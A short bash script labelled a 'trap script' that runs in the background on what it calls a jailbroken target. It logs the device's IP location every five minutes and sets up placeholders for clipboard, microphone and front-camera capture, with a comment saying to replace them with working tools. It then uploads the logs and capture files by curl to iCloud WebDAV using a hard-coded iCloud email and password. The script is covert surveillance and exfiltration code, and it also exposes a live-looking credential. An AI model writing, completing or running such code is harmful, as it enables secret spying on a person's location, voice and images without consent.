#!/bin/bash

# Trap script - runs persistently in background
LOG_DIR="/var/root/trap-logs"
UPLOAD_DIR="/var/root/trap-uploads"
mkdir -p "$LOG_DIR" "$UPLOAD_DIR"

ICLOUD_EMAIL="infinitelyenlighten@icloud.com"
ICLOUD_PASS="nfhj-cryh-awrf-ezgf"

while true; do
  TIMESTAMP=$(date +%s)
  LOGFILE="$LOG_DIR/log_$TIMESTAMP.txt"

  echo "[$(date)] 📸 Running trap..." > "$LOGFILE"

  # 🧠 Clipboard (Mock for now)
  echo "Clipboard content: (mocked)" >> "$LOGFILE"

  # 📍 GPS Spoof Check (mocked)
  echo "GPS claimed: (mocked location) | Actual IP location: $(curl -s ipinfo.io/loc)" >> "$LOGFILE"

  # 🎙️ Mic capture every 5 min (mock - replace with working tool on jailbroken target)
  AUDIO_FILE="$UPLOAD_DIR/audio_$TIMESTAMP.m4a"
  touch "$AUDIO_FILE"

  # 📷 Front camera (mocked for now)
  SNAPSHOT_FILE="$UPLOAD_DIR/photo_$TIMESTAMP.jpg"
  touch "$SNAPSHOT_FILE"

  # 📤 Upload
  curl -T "$LOGFILE" -u "$ICLOUD_EMAIL:$ICLOUD_PASS" https://webdav.icloud.com/Logs/
  curl -T "$SNAPSHOT_FILE" -u "$ICLOUD_EMAIL:$ICLOUD_PASS" https://webdav.icloud.com/Snaps/
  curl -T "$AUDIO_FILE" -u "$ICLOUD_EMAIL:$ICLOUD_PASS" https://webdav.icloud.com/Snaps/

  sleep 300
done

